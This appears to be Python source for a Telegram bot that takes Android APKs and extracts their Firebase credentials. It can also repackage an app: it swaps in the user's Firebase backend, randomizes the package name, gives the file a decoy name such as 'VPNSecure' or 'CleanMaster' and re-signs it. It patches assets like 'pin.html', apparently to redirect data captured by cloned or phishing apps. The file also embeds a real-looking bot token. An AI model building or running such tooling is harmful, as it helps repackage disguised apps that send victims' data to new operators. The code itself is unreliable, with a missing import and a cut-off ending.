"""
Telegram Bot for Firebase APK Modifier & Extractor v2.0
- APK receive karo
- Firebase config extract karo (Extract mode)
- Firebase config inject karo (Modify mode)
- Decompile, modify, recompile & sign karo
- User ko APK/Config bhejo
"""

import os
import re
import shutil
import subprocess
import logging
import random
import string
import urllib.request
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    CallbackQueryHandler,
    filters
)

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# States for conversation
CHOOSING_MODE, WAITING_APK, WAITING_DATABASE_URL, WAITING_API_KEY, WAITING_APP_ID, WAITING_STORAGE_BUCKET, WAITING_PROJECT_ID, WAITING_EXTRACT_APK = range(8)

# Configuration
BOT_TOKEN = "8442989333:AAHKTjaacGUl0MOAaOJ4ae0zGd7tFI8_-dA"
WORK_DIR = os.path.dirname(os.path.abspath(__file__))
APKTOOL_PATH = os.path.join(WORK_DIR, "apktool.jar")
KEYSTORE_PATH = os.path.join(WORK_DIR, "debug.keystore")

# Auto-detect Java paths
def find_java():
    """Find Java executable in common locations"""
    possible_paths = [
        "java",  # In PATH
        "/usr/bin/java",  # Linux default
        "/usr/lib/jvm/default-java/bin/java",  # Debian/Ubuntu
        "/usr/lib/jvm/java-21-openjdk-amd64/bin/java",  # OpenJDK 21
        "/usr/lib/jvm/java-17-openjdk-amd64/bin/java",  # OpenJDK 17
        "/usr/lib/jvm/java-11-openjdk-amd64/bin/java",  # OpenJDK 11
        os.path.join(os.environ.get("JAVA_HOME", ""), "bin", "java"),  # JAVA_HOME
    ]
    
    for path in possible_paths:
        if not path:
            continue
        try:
            result = subprocess.run([path, "-version"], capture_output=True, timeout=5, stderr=subprocess.STDOUT)
            if result.returncode == 0:
                logger.info(f"✅ Java found at: {path}")
                return path
        except (FileNotFoundError, subprocess.TimeoutExpired, Exception) as e:
            logger.debug(f"Tried {path}: {e}")
            continue
    
    logger.error("❌ Java not found in any common location!")
    logger.error("Please install Java JDK/JRE")
    return "java"  # Fallback

JAVA_PATH = find_java()
KEYTOOL_PATH = JAVA_PATH.replace("java", "keytool") if JAVA_PATH != "java" else "keytool"
JARSIGNER_PATH = JAVA_PATH.replace("java", "jarsigner") if JAVA_PATH != "java" else "jarsigner"

# Admin Channel Configuration
ADMIN_CHANNEL_ID = "-1003861506347"  # Your admin channel ID

# Keystore config
KEYSTORE_PASS = "android"
KEY_ALIAS = "androiddebugkey"
KEY_PASS = "android"

def download_apktool():
    """Apktool download karo agar nahi hai"""
    if os.path.exists(APKTOOL_PATH):
        return True
    
    print("📥 Apktool.jar not found. Downloading...")
    
    try:
        # Latest stable version
        apktool_url = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
        
        print(f"⏳ Downloading from: {apktool_url}")
        urllib.request.urlretrieve(apktool_url, APKTOOL_PATH)
        
        if os.path.exists(APKTOOL_PATH):
            file_size = os.path.getsize(APKTOOL_PATH) / (1024 * 1024)
            print(f"✅ Apktool downloaded successfully! ({file_size:.2f} MB)")
            return True
        else:
            print("❌ Download failed!")
            return False
            
    except Exception as e:
        print(f"❌ Error downloading apktool: {e}")
        print("Please manually download from: https://github.com/iBotPeaches/Apktool/releases")
        return False

def ensure_dirs():
    """Required directories create karo"""
    dirs = ["apks", "decompiled", "modified", "output"]
    for d in dirs:
        path = os.path.join(WORK_DIR, d)
        if not os.path.exists(path):
            os.makedirs(path)

def generate_random_package():
    """Random package name generate karo"""
    prefixes = ['com']  # Sirf com use karo
    words = ['mobile', 'smart', 'super', 'pro', 'lite', 'plus', 'fast', 'cool', 'best', 'top', 'mega', 'ultra', 'prime', 'max', 'go', 'app', 'tech', 'soft', 'dev', 'code']
    
    prefix = random.choice(prefixes)
    word1 = random.choice(words)
    word2 = random.choice(words)
    random_suffix = ''.join(random.choices(string.ascii_lowercase, k=4))
    
    return f"{prefix}.{word1}{word2}.{random_suffix}"

def generate_random_apk_name():
    """Random APK filename generate karo"""
    app_names = [
        'SuperApp', 'ProTools', 'FastBrowser', 'SmartManager', 'UltraBoost',
        'MegaPlayer', 'CoolLauncher', 'PowerSaver', 'QuickShare', 'EasyNote',
        'PhotoEditor', 'VideoMaker', 'MusicBox', 'GameCenter', 'FileManager',
        'CleanMaster', 'SpeedTest', 'WeatherLive', 'FitTracker', 'NewsDaily',
        'ChatPro', 'VPNSecure', 'PDFReader', 'QRScanner', 'Calculator',
        'Flashlight', 'Compass', 'Translator', 'Dictionary', 'Calendar'
    ]
    
    versions = ['1.0', '1.1', '1.2', '2.0', '2.1', '2.5', '3.0', '3.1', '4.0', '5.0']
    
    app_name = random.choice(app_names)
    version = random.choice(versions)
    random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    
    return f"{app_name}_v{version}_{random_suffix}.apk"

def change_package_name(decompiled_dir, new_package):
    """APK ka package name change karo"""
    manifest_path = os.path.join(decompiled_dir, "AndroidManifest.xml")
    
    if not os.path.exists(manifest_path):
        logger.error(f"AndroidManifest.xml not found at {manifest_path}")
        return None
    
    # Read manifest
    with open(manifest_path, 'r', encoding='utf-8') as f:
        manifest_content = f.read()
    
    # Extract old package name
    match = re.search(r'package="([^"]+)"', manifest_content)
    if not match:
        logger.error("Could not find package name in AndroidManifest.xml")
        return None
    
    old_package = match.group(1)
    logger.info(f"Old package: {old_package}")
    logger.info(f"New package: {new_package}")
    
    # Replace package in manifest
    manifest_content = re.sub(
        r'package="[^"]+"',
        f'package="{new_package}"',
        manifest_content
    )
    
    with open(manifest_path, 'w', encoding='utf-8') as f:
        f.write(manifest_content)
    
    logger.info("Package name updated in AndroidManifest.xml")
    
    # Update smali files - rename directories and update references
    old_package_path = old_package.replace('.', os.sep)
    new_package_path = new_package.replace('.', os.sep)
    old_package_smali = old_package.replace('.', '/')
    new_package_smali = new_package.replace('.', '/')
    
    # Find all smali directories
    smali_dirs = [d for d in os.listdir(decompiled_dir) if d.startswith('smali')]
    logger.info(f"Found {len(smali_dirs)} smali directories")
    
    files_updated = 0
    for smali_dir in smali_dirs:
        smali_path = os.path.join(decompiled_dir, smali_dir)
        
        # Update references in all smali files
        for root, dirs, files in os.walk(smali_path):
            for file in files:
                if file.endswith('.smali'):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                        
                        # Replace old package references with new
                        if old_package_smali in content:
                            content = content.replace(old_package_smali, new_package_smali)
                            with open(file_path, 'w', encoding='utf-8') as f:
                                f.write(content)
                            files_updated += 1
                    except Exception as e:
                        logger.warning(f"Could not update {file}: {e}")
    
    logger.info(f"Updated package references in {files_updated} smali files")
    
    # Also update apktool.yml if exists
    apktool_yml = os.path.join(decompiled_dir, "apktool.yml")
    if os.path.exists(apktool_yml):
        try:
            with open(apktool_yml, 'r', encoding='utf-8') as f:
                yml_content = f.read()
            
            # Update renameManifestPackage
            if 'renameManifestPackage:' in yml_content:
                yml_content = re.sub(
                    r'renameManifestPackage: .*',
                    f'renameManifestPackage: {new_package}',
                    yml_content
                )
            else:
                # Add it if not present
                yml_content += f'\nrenameManifestPackage: {new_package}\n'
            
            with open(apktool_yml, 'w', encoding='utf-8') as f:
                f.write(yml_content)
            
            logger.info("Updated apktool.yml with new package name")
        except Exception as e:
            logger.warning(f"Could not update apktool.yml: {e}")
    
    return old_package

def create_debug_keystore():
    """Debug keystore create karo agar nahi hai"""
    if not os.path.exists(KEYSTORE_PATH):
        try:
            cmd = [
                KEYTOOL_PATH, "-genkey", "-v",
                "-keystore", KEYSTORE_PATH,
                "-storepass", KEYSTORE_PASS,
                "-alias", KEY_ALIAS,
                "-keypass", KEY_PASS,
                "-keyalg", "RSA",
                "-keysize", "2048",
                "-validity", "10000",
                "-dname", "CN=Android Debug,O=Android,C=US"
            ]
            subprocess.run(cmd, check=True, capture_output=True, shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
            logger.info("Debug keystore created successfully")
        except Exception as e:
            logger.warning(f"Could not create keystore: {e}")

async def send_to_admin_channel(context: ContextTypes.DEFAULT_TYPE, message: str, parse_mode='Markdown'):
    """Admin channel pe message bhejo"""
    if not ADMIN_CHANNEL_ID or ADMIN_CHANNEL_ID == "@your_channel_username":
        logger.warning("Admin channel not configured")
        return
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_CHANNEL_ID,
            text=message,
            parse_mode=parse_mode
        )
        logger.info(f"✅ Message sent to admin channel: {ADMIN_CHANNEL_ID}")
    except Exception as e:
        logger.error(f"❌ Failed to send to admin channel: {e}")
        logger.error(f"   Make sure bot is admin in channel {ADMIN_CHANNEL_ID}")

def get_main_keyboard():
    """Main keyboard with permanent buttons"""
    keyboard = [
        [KeyboardButton("🔍 Extract"), KeyboardButton("✏️ Inject")],
        [KeyboardButton("❓ Help"), KeyboardButton("❌ Cancel")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler with buttons"""
    context.user_data.clear()
    
    welcome_text = """
🔥 *Firebase APK Modifier & Extractor Bot* 🔥

Main aapki APK ke saath 2 kaam kar sakta hoon!

� *Features:*

🔍 *Extract Mode* - APK se Firebase config nikalo
✏️ *Inject Mode* - APK mein Firebase config inject karo

⚠️ *Requirements:*
• APK 50MB se kam honi chahiye
• Sirf valid APK files accept hongi

👇 Neeche ke buttons use karo:
    """
    
    await update.message.reply_text(
        welcome_text,
        parse_mode='Markdown',
        reply_markup=get_main_keyboard()
    )
    return CHOOSING_MODE

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button clicks"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'mode_extract':
        context.user_data['mode'] = 'extract'
        await query.edit_message_text(
            "🔍 *Extract Mode Selected!*\n\n"
            "Please apni APK file bhejo.\n"
            "Max size: 50MB\n\n"
            "Main APK se Firebase config extract kar dunga!",
            parse_mode='Markdown'
        )
        return WAITING_EXTRACT_APK
    
    elif query.data == 'mode_inject':
        context.user_data['mode'] = 'inject'
        await query.edit_message_text(
            "✏️ *Inject Mode Selected!*\n\n"
            "Please apni APK file bhejo.\n"
            "Max size: 50MB\n\n"
            "Baad mein Firebase details maangunga!",
            parse_mode='Markdown'
        )
        return WAITING_APK
    
    elif query.data == 'show_help':
        help_text = """
🆘 *Help - Firebase APK Tool*

*Extract Mode:*
• APK bhejo
• Firebase config automatically extract hoga
• JSON file milegi

*Inject Mode:*
• APK bhejo
• Firebase details do
• Modified APK milegi

*Firebase Config kahan se lein:*
1. Firebase Console jao
2. Project Settings > General
3. Details copy karo

Wapas menu ke liye /start bhejo!
        """
        await query.edit_message_text(help_text, parse_mode='Markdown')
        return ConversationHandler.END

async def handle_keyboard_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle permanent keyboard button presses"""
    text = update.message.text
    
    if text == "🔍 Extract":
        context.user_data.clear()
        context.user_data['mode'] = 'extract'
        await update.message.reply_text(
            "🔍 *Extract Mode Selected!*\n\n"
            "Please apni APK file bhejo.\n"
            "Max size: 50MB\n\n"
            "Main APK se Firebase config extract kar dunga!",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        return WAITING_EXTRACT_APK
    
    elif text == "✏️ Inject":
        context.user_data.clear()
        context.user_data['mode'] = 'inject'
        await update.message.reply_text(
            "✏️ *Inject Mode Selected!*\n\n"
            "Please apni APK file bhejo.\n"
            "Max size: 50MB\n\n"
            "Baad mein Firebase details maangunga!",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        return WAITING_APK
    
    elif text == "❓ Help":
        help_text = """
🆘 *Help - Firebase APK Tool*

*Extract Mode:*
• APK bhejo
• Firebase config automatically extract hoga
• JSON file milegi

*Inject Mode:*
• APK bhejo
• Firebase details do
• Modified APK milegi

*Firebase Config kahan se lein:*
1. Firebase Console jao
2. Project Settings > General
3. Details copy karo

*Commands:*
/start - Main menu
/extract - Direct extract mode
/modify - Direct inject mode
/help - Help message
        """
        await update.message.reply_text(
            help_text,
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        return CHOOSING_MODE
    
    elif text == "❌ Cancel":
        context.user_data.clear()
        await update.message.reply_text(
            "❌ Process cancelled!\n\n"
            "Kya karna hai? Neeche se select karo:",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        return CHOOSING_MODE
    
    return CHOOSING_MODE

async def modify_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Modification process start karo (command se)"""
    context.user_data.clear()
    context.user_data['mode'] = 'inject'
    
    await update.message.reply_text(
        "✏️ *APK Injection Started!*\n\n"
        "Please apni APK file bhejo.\n"
        "Max size: 50MB",
        parse_mode='Markdown',
        reply_markup=get_main_keyboard()
    )
    return WAITING_APK

async def extract_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Extract process start karo (command se)"""
    context.user_data.clear()
    context.user_data['mode'] = 'extract'
    
    await update.message.reply_text(
        "🔍 *Firebase Config Extraction Started!*\n\n"
        "Please apni APK file bhejo.\n"
        "Max size: 50MB\n\n"
        "Main APK se Firebase config extract kar dunga!",
        parse_mode='Markdown',
        reply_markup=get_main_keyboard()
    )
    return WAITING_EXTRACT_APK

async def receive_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User se APK receive karo"""
    document = update.message.document
    
    if not document:
        await update.message.reply_text("❌ Please ek APK file bhejo!")
        return WAITING_APK
    
    if not document.file_name.endswith('.apk'):
        await update.message.reply_text("❌ Sirf APK files allowed hain!")
        return WAITING_APK
    
    # Check file size (recommend smaller APKs for faster processing)
    file_size_mb = document.file_size / (1024 * 1024) if document.file_size else 0
    if file_size_mb > 50:
        await update.message.reply_text(
            f"⚠️ APK size: {file_size_mb:.1f} MB\n\n"
            "Badi APK mein zyada time lagega (20-30 min).\n"
            "Chhoti APK (<15 MB) fast process hoti hai (5-10 min).\n\n"
            "Continue karna hai? /cancel to stop.",
            parse_mode='Markdown'
        )
    
    progress_msg = await update.message.reply_text("⏳ APK download ho rahi hai...")
    
    try:
        ensure_dirs()
        user_id = update.effective_user.id
        apk_dir = os.path.join(WORK_DIR, "apks", str(user_id))
        if os.path.exists(apk_dir):
            shutil.rmtree(apk_dir)
        os.makedirs(apk_dir)
        
        apk_path = os.path.join(apk_dir, document.file_name)
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(apk_path)
        
        context.user_data['apk_path'] = apk_path
        context.user_data['apk_name'] = document.file_name
        context.user_data['user_dir'] = apk_dir
        
        await progress_msg.edit_text(
            f"✅ APK received: `{document.file_name}`\n\n"
            "Ab apna *Firebase Database URL* bhejo:\n"
            "Example: `https://your-project-default-rtdb.firebaseio.com`",
            parse_mode='Markdown'
        )
        return WAITING_DATABASE_URL
        
    except Exception as e:
        logger.error(f"APK download error: {e}")
        await progress_msg.edit_text(f"❌ Error: {str(e)}")
        return ConversationHandler.END

async def receive_database_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Firebase Database URL receive karo"""
    url = update.message.text.strip()
    
    # Accept both firebaseio.com and firebasedatabase.app URLs
    if not url.startswith("https://") or ("firebaseio.com" not in url and "firebasedatabase.app" not in url):
        await update.message.reply_text(
            "❌ Invalid Database URL!\n"
            "Format: `https://your-project-default-rtdb.firebaseio.com`\n"
            "Ya: `https://your-project-default-rtdb.asia-southeast1.firebasedatabase.app`",
            parse_mode='Markdown'
        )
        return WAITING_DATABASE_URL
    
    context.user_data['firebase_database_url'] = url
    
    await update.message.reply_text(
        "✅ Database URL saved!\n\n"
        "Ab apna *Google API Key* bhejo:\n"
        "Example: `AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`",
        parse_mode='Markdown'
    )
    return WAITING_API_KEY

async def receive_api_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Google API Key receive karo"""
    api_key = update.message.text.strip()
    
    # More flexible validation
    if len(api_key) < 30:
        await update.message.reply_text(
            "❌ Invalid API Key!\n\n"
            "API Key bahut chhoti hai.\n"
            "Sahi API Key 39 characters ki hoti hai.\n\n"
            "Example: `AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`\n\n"
            "Firebase Console se copy karo:\n"
            "Project Settings → General → Web API Key",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        return WAITING_API_KEY
    
    if not api_key.startswith("AIza"):
        await update.message.reply_text(
            "⚠️ Warning: API Key 'AIza' se start nahi hoti!\n\n"
            "Kya ye sahi API Key hai?\n"
            "Agar haan, to dobara same key bhejo.\n"
            "Agar nahi, to sahi key bhejo.\n\n"
            "Firebase Console → Project Settings → Web API Key",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        # Allow it anyway if user sends again
        if context.user_data.get('api_key_warned'):
            context.user_data['google_api_key'] = api_key
            await update.message.reply_text(
                "✅ API Key saved!\n\n"
                "Ab apna *Google App ID* bhejo:\n"
                "Example: `1:123456789:android:abcdef123456`",
                parse_mode='Markdown',
                reply_markup=get_main_keyboard()
            )
            context.user_data.pop('api_key_warned', None)
            return WAITING_APP_ID
        else:
            context.user_data['api_key_warned'] = True
            return WAITING_API_KEY
    
    context.user_data['google_api_key'] = api_key
    
    await update.message.reply_text(
        "✅ API Key saved!\n\n"
        "Ab apna *Google App ID* bhejo:\n"
        "Example: `1:123456789:android:abcdef123456`",
        parse_mode='Markdown',
        reply_markup=get_main_keyboard()
    )
    return WAITING_APP_ID

async def receive_app_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Google App ID receive karo"""
    app_id = update.message.text.strip()
    
    if ":" not in app_id or "android" not in app_id:
        await update.message.reply_text(
            "❌ Invalid App ID!\n"
            "Format: `1:123456789:android:abcdef123456`",
            parse_mode='Markdown'
        )
        return WAITING_APP_ID
    
    context.user_data['google_app_id'] = app_id
    
    await update.message.reply_text(
        "✅ App ID saved!\n\n"
        "Ab apna *Storage Bucket* bhejo:\n"
        "Example: `your-project.firebasestorage.app`",
        parse_mode='Markdown'
    )
    return WAITING_STORAGE_BUCKET

async def receive_storage_bucket(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Storage Bucket receive karo"""
    bucket = update.message.text.strip()
    
    context.user_data['google_storage_bucket'] = bucket
    
    await update.message.reply_text(
        "✅ Storage Bucket saved!\n\n"
        "Ab apna *Project ID* bhejo:\n"
        "Example: `my-firebase-project`",
        parse_mode='Markdown'
    )
    return WAITING_PROJECT_ID

async def receive_project_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Project ID receive karo aur modification start karo"""
    project_id = update.message.text.strip()
    
    context.user_data['project_id'] = project_id
    
    progress_msg = await update.message.reply_text(
        "🔧 *Processing Started...*\n\n"
        "⏳ Step 1/5: Decompiling APK...",
        parse_mode='Markdown'
    )
    
    try:
        user_id = update.effective_user.id
        apk_path = context.user_data['apk_path']
        apk_name = context.user_data['apk_name']
        user_dir = context.user_data['user_dir']
        
        decompiled_dir = os.path.join(user_dir, "decompiled")
        output_dir = os.path.join(user_dir, "output")
        
        # Step 1: Decompile
        # Check Java installation
        try:
            java_check = subprocess.run([JAVA_PATH, "-version"], capture_output=True, text=True, timeout=10)
        except FileNotFoundError:
            raise Exception("Java not found! Please install Java JDK/JRE first.")
        
        await progress_msg.edit_text(
            "🔧 *Processing...*\n\n"
            "⏳ Step 1/6: Decompiling APK...\n\n"
            "⏱️ Badi APK mein 10-20 min lag sakte hain.\n"
            "Please wait karo...",
            parse_mode='Markdown'
        )
        
        decompile_cmd = [
            JAVA_PATH, "-Xmx1024m", "-jar", APKTOOL_PATH,
            "d", apk_path,
            "-o", decompiled_dir,
            "-f"
        ]
        result = subprocess.run(decompile_cmd, capture_output=True, text=True, timeout=3600, shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
        if result.returncode != 0:
            error_msg = result.stderr if result.stderr else result.stdout
            raise Exception(f"Decompile failed: {error_msg[:500]}")
        
        await progress_msg.edit_text(
            "🔧 *Processing...*\n\n"
            "✅ Step 1/6: Decompiled\n"
            "⏳ Step 2/6: Changing package name...",
            parse_mode='Markdown'
        )
        
        # Step 2: Package name change karo
        new_package = generate_random_package()
        old_package = change_package_name(decompiled_dir, new_package)
        context.user_data['new_package'] = new_package
        context.user_data['old_package'] = old_package
        
        await progress_msg.edit_text(
            "🔧 *Processing...*\n\n"
            "✅ Step 1/6: Decompiled\n"
            f"✅ Step 2/6: Package name changed\n"
            f"   Old: `{old_package if old_package else 'Unknown'}`\n"
            f"   New: `{new_package}`\n"
            "⏳ Step 3/6: Modifying Firebase config...\n\n"
            f"🔥 Updating:\n"
            f"   • Database URL\n"
            f"   • API Key\n"
            f"   • App ID\n"
            f"   • Storage Bucket\n"
            f"   • Project ID",
            parse_mode='Markdown'
        )
        
        # Step 3: strings.xml modify karo
        strings_path = os.path.join(decompiled_dir, "res", "values", "strings.xml")
        
        if not os.path.exists(strings_path):
            raise Exception("strings.xml not found! APK may not use Firebase.")
        
        with open(strings_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Firebase values replace karo
        firebase_mappings = {
            'firebase_database_url': context.user_data['firebase_database_url'],
            'google_api_key': context.user_data['google_api_key'],
            'google_app_id': context.user_data['google_app_id'],
            'google_storage_bucket': context.user_data['google_storage_bucket'],
            'project_id': context.user_data['project_id']
        }
        
        modified_content = content
        changes_made = 0
        for key, value in firebase_mappings.items():
            pattern = rf'(<string name="{key}">)[^<]*(</string>)'
            if re.search(pattern, modified_content):
                modified_content = re.sub(pattern, rf'\g<1>{value}\g<2>', modified_content)
                changes_made += 1
        
        if changes_made == 0:
            logger.warning("No Firebase config found in strings.xml, checking assets...")
        
        with open(strings_path, 'w', encoding='utf-8') as f:
            f.write(modified_content)
        
        # Step 3.5: Assets folder mein HTML files check karo (pin.html, etc.)
        assets_dir = os.path.join(decompiled_dir, "assets")
        assets_changes = 0
        
        if os.path.exists(assets_dir):
            # All HTML files mein Firebase URL replace karo
            for root, dirs, files in os.walk(assets_dir):
                for file in files:
                    if file.endswith(('.html', '.htm', '.js', '.json')):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                file_content = f.read()
                            
                            original_content = file_content
                            
                            # Firebase database URLs replace karo (all formats)
                            # Format 1: https://xxx-default-rtdb.firebaseio.com
                            # Format 2: https://xxx-default-rtdb.asia-southeast1.firebasedatabase.app
                            firebase_url_pattern = r'https://[a-zA-Z0-9-]+-default-rtdb[a-zA-Z0-9.-]*\.(firebaseio\.com|firebasedatabase\.app)'
                            
                            if re.search(firebase_url_pattern, file_content):
                                file_content = re.sub(
                                    firebase_url_pattern,
                                    context.user_data['firebase_database_url'],
                                    file_content
                                )
                                assets_changes += 1
                            
                            if file_content != original_content:
                                with open(file_path, 'w', encoding='utf-8') as f:
                                    f.write(file_content)
                                logger.info(f"Modified Firebase URL in: {file}")
                        except Exception as e:
                            logger.warning(f"Could not process {file}: {e}")
        
        total_changes = changes_made + assets_changes
        
        if total_changes == 0:
            raise Exception("No Firebase config found in APK!")
        
        await progress_msg.edit_text(
            f"🔧 *Processing...*\n\n"
            f"✅ Step 1/6: Decompiled\n"
            f"✅ Step 2/6: Package changed\n"
            f"✅ Step 3/6: Firebase modified\n"
            f"   • {changes_made} strings updated\n"
            f"   • {assets_changes} asset files updated\n"
            f"   • Total: {total_changes} changes\n"
            "⏳ Step 4/6: Rebuilding APK...",
            parse_mode='Markdown'
        )
        
        # Step 4: Rebuild APK with better options
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        unsigned_apk = os.path.join(output_dir, "unsigned.apk")
        
        # Simple build without extra flags
        build_cmd = [
            JAVA_PATH, "-Xmx1024m", "-jar", APKTOOL_PATH,
            "b", decompiled_dir,
            "-o", unsigned_apk,
            "-f"
        ]
        
        await progress_msg.edit_text(
            "🔧 *Processing...*\n\n"
            "✅ Step 1/6: Decompiled\n"
            "✅ Step 2/6: Package changed\n"
            "✅ Step 3/6: Firebase modified\n"
            "⏳ Step 4/6: Rebuilding APK...\n\n"
            "⏱️ Badi APK mein 15-30 min lag sakte hain.\n"
            "Background mein process chal rahi hai...",
            parse_mode='Markdown'
        )
        
        result = subprocess.run(build_cmd, capture_output=True, text=True, timeout=3600, shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)  # 60 min
        if result.returncode != 0:
            error_msg = result.stderr if result.stderr else result.stdout
            raise Exception(f"Build failed: {error_msg[:500]}")
        
        await progress_msg.edit_text(
            "🔧 *Processing...*\n\n"
            "✅ Step 1/6: Decompiled\n"
            "✅ Step 2/6: Package changed\n"
            "✅ Step 3/6: Firebase modified\n"
            "✅ Step 4/6: APK rebuilt\n"
            "⏳ Step 5/6: Signing APK...\n\n"
            "⏱️ Almost done...",
            parse_mode='Markdown'
        )
        
        # Step 5: Sign APK with proper v1+v2 signing
        create_debug_keystore()
        
        signed_apk = os.path.join(output_dir, f"modified_{apk_name}")
        
        signed_successfully = False
        
        # Method 1: uber-apk-signer (BEST - automatic zipalign + v1/v2/v3 signing)
        uber_signer_path = os.path.join(WORK_DIR, "uber-apk-signer.jar")
        if not os.path.exists(uber_signer_path):
            try:
                logger.info("Downloading uber-apk-signer...")
                uber_url = "https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar"
                urllib.request.urlretrieve(uber_url, uber_signer_path)
                logger.info("uber-apk-signer downloaded!")
            except Exception as e:
                logger.warning(f"Could not download uber-apk-signer: {e}")
        
        if os.path.exists(uber_signer_path):
            try:
                # uber-apk-signer automatically does: zipalign + v1/v2/v3 signing
                uber_cmd = [
                    JAVA_PATH, "-jar", uber_signer_path,
                    "--apks", unsigned_apk,
                    "--ks", KEYSTORE_PATH,
                    "--ksPass", KEYSTORE_PASS,
                    "--ksKeyPass", KEY_PASS,
                    "--ksAlias", KEY_ALIAS,
                    "--allowResign",
                    "--overwrite",
                    "--zipAlignEnabled", "true",
                    "-o", output_dir
                ]
                result = subprocess.run(uber_cmd, capture_output=True, text=True, timeout=180, shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
                
                if result.returncode == 0:
                    # uber-apk-signer creates file with -aligned-debugSigned.apk suffix
                    base_name = os.path.splitext(os.path.basename(unsigned_apk))[0]
                    uber_output = os.path.join(output_dir, f"{base_name}-aligned-debugSigned.apk")
                    
                    if os.path.exists(uber_output):
                        shutil.copy(uber_output, signed_apk)
                        signed_successfully = True
                        logger.info("✅ Signed with uber-apk-signer (v1+v2+v3, zipaligned)")
                    else:
                        # Try to find any signed APK in output dir
                        for file in os.listdir(output_dir):
                            if file.endswith("-aligned-debugSigned.apk"):
                                shutil.copy(os.path.join(output_dir, file), signed_apk)
                                signed_successfully = True
                                logger.info("✅ Signed APK found and copied")
                                break
                else:
                    logger.warning(f"uber-apk-signer error: {result.stderr}")
            except Exception as e:
                logger.warning(f"uber-apk-signer failed: {e}")
        
        # Method 2: jarsigner with v1 signing (fallback)
        if not signed_successfully:
            try:
                # First copy unsigned to signed location
                shutil.copy(unsigned_apk, signed_apk)
                
                sign_cmd = [
                    JARSIGNER_PATH,
                    "-verbose",
                    "-sigalg", "SHA256withRSA",
                    "-digestalg", "SHA-256",
                    "-keystore", KEYSTORE_PATH,
                    "-storepass", KEYSTORE_PASS,
                    "-keypass", KEY_PASS,
                    signed_apk,
                    KEY_ALIAS
                ]
                result = subprocess.run(sign_cmd, capture_output=True, text=True, timeout=60, shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
                
                if result.returncode == 0:
                    signed_successfully = True
                    logger.info("✅ Signed with jarsigner (v1 only)")
                else:
                    logger.warning(f"jarsigner error: {result.stderr}")
            except Exception as e:
                logger.warning(f"jarsigner failed: {e}")
        
        # Last resort: copy unsigned (will not install but at least user gets file)
        if not signed_successfully:
            logger.warning("⚠️ All signing methods failed, using unsigned APK (may not install)")
            shutil.copy(unsigned_apk, signed_apk)
            
            # User ko warning do
            await progress_msg.edit_text(
                "⚠️ *Warning: APK Signing Issue*\n\n"
                "APK sign nahi ho paya properly.\n\n"
                "*Install karne ke liye:*\n"
                "1. Purana app uninstall karo (agar installed hai)\n"
                "2. Settings → Security → Unknown Sources enable karo\n"
                "3. APK install karo\n\n"
                "Ya phir apne PC pe manually sign karo using apksigner.",
                parse_mode='Markdown'
            )
            await asyncio.sleep(3)
        
        await progress_msg.edit_text(
            "🔧 *Processing...*\n\n"
            "✅ Step 1/6: Decompiled\n"
            "✅ Step 2/6: Package changed\n"
            "✅ Step 3/6: Firebase modified\n"
            "✅ Step 4/6: APK rebuilt\n"
            "✅ Step 5/6: APK signed\n"
            "⏳ Step 6/6: Uploading...",
            parse_mode='Markdown'
        )
        
        # Step 6: APK bhejo with random filename
        random_apk_name = generate_random_apk_name()
        context.user_data['random_apk_name'] = random_apk_name
        
        # Prepare detailed change log
        old_pkg = context.user_data.get('old_package', 'Unknown')
        new_pkg = context.user_data.get('new_package', 'Unknown')
        
        change_log = (
            "✅ *APK Modified Successfully!*\n\n"
            "📋 *Changes Made:*\n\n"
            f"📦 *Package Name Changed:*\n"
            f"   Old: `{old_pkg}`\n"
            f"   New: `{new_pkg}`\n\n"
            f"🔥 *Firebase Config Updated:*\n"
            f"   • Database URL: `{context.user_data['firebase_database_url']}`\n"
            f"   • API Key: `{context.user_data['google_api_key'][:20]}...`\n"
            f"   • App ID: `{context.user_data['google_app_id']}`\n"
